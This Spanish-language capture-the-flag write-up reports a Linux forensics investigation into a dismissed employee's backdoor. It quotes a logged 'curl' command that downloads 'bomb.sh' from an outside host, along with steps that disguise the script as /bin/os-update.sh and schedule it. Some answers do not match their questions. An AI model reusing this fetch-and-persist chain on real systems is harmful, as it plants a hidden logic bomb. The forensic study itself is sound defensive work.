# 🏆 Desafío Forense en Linux - Disgruntled

## 🎯 Objetivo
#### El día comenzó con una noticia inesperada: un empleado del equipo de IT de **CyberT**, uno de nuestros clientes, fue arrestado por la policía. ¿El motivo? Ejecutar una operación de *phishing* paralela mientras trabajaba para la empresa. CyberT sospecha que este usuario pudo haber dejado backdoors o configuraciones maliciosas antes de su detención, y nos pide que investiguemos cualquier rastro en sus sistemas.
---

### 1️⃣ El usuario instaló un paquete en la máquina utilizando privilegios elevados. Según los logs, ¿Cuál es el COMANDO completo?
#### Empecé inspeccionando `/var/log/auth.log`, archivo esencial que registra todos los intentos de autenticación y comandos ejecutados con `sudo`.  
#### ✅ `/usr/bin/apt install dokuwiki`
![](https://raw.githubusercontent.com/JoshKxng/SOC-Analyst-TryHackMe/refs/heads/main/imagenes/Linux%20Forensics/01.png)

---

## 2️⃣  ¿Cuál era el directorio de trabajo (PWD) cuando se ejecutó el comando anterior y qué usuario fue creado después?
#### Seguí observando `auth.log` y encontré el uso del comando `adduser`, lo cual indica la creación de un nuevo usuario.  
#### ✅ `/home/cybert`
#### ✅ `it-admin`

![](https://raw.githubusercontent.com/JoshKxng/SOC-Analyst-TryHackMe/refs/heads/main/imagenes/Linux%20Forensics/02.png)

---

## 3️⃣ Se le otorgaron privilegios de sudo a un usuario. ¿Cuándo se actualizó el archivo sudoers y qué nombre tenía el script abierto con el editor "vi"?
#### Analicé el uso de `visudo` nuevamente en `auth.log` y encontré la edición de un archivo sospechoso llamado `bomb.sh`.
#### ✅ `Dec 28 06:27:34`
#### ✅ `bomb.sh`
![](https://raw.githubusercontent.com/JoshKxng/SOC-Analyst-TryHackMe/refs/heads/main/imagenes/Linux%20Forensics/03.png)

---

## 4️⃣ ¿Cuándo fue modificado por última vez el archivo del punto anterior? 
#### Acá lo que ejecuté fue el uso del comando `cat` dentro del directorio correspondiente. Tuve que listarlos previamente para estar seguro de avanzar correctamente.
#### ✅ `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`
![](https://raw.githubusercontent.com/JoshKxng/SOC-Analyst-TryHackMe/refs/heads/main/imagenes/Linux%20Forensics/04.png)

---

## 5️⃣ El archivo se renombró y se movió a otro directorio. ¿Cuál es la ruta completa de este archivo ahora?
#### ✅ `/bin/os-update.sh`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Linux%20Forensics/05.png)

---

## 6️⃣ ¿Cuándo se modificó por última vez el archivo de la pregunta anterior y cuál es el nombre del archivo que se creará cuando se ejecute el archivo de la primera pregunta?
![](https://raw.githubusercontent.com/JoshKxng/SOC-Analyst-TryHackMe/refs/heads/main/imagenes/Linux%20Forensics/07.png)
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Linux%20Forensics/08.png)

---

# 🎖️ Conclusión
### A medida que fui avanzando con este caso logré reconstruir cómo un atacante:

### - Instaló paquetes maliciosos con privilegios elevados.
### - Creó un nuevo usuario para mantener el acceso.
### - Editó un script que generaba archivos ocultos.
### - Automatizó su ejecución mediante tareas programadas.
